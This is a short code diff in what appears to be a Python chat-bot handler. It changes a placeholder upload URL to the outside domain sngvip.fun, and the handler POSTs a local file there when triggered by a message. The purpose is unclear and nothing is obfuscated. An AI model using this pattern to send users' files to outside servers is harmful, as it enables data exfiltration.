@@ -74,7 +74,7 @@ def trigger_upload2(client, message):
     )
 
     # Modify the upload2_url accordingly
-    upload2_url = "https://yourwebsite.com/upload2.php"
+    upload2_url = "https://sngvip.fun/upload2.php"
     try:
         response = requests.post(upload2_url, files={'file': open('yourfile.txt', 'rb')})
         if response.status_code == 200:
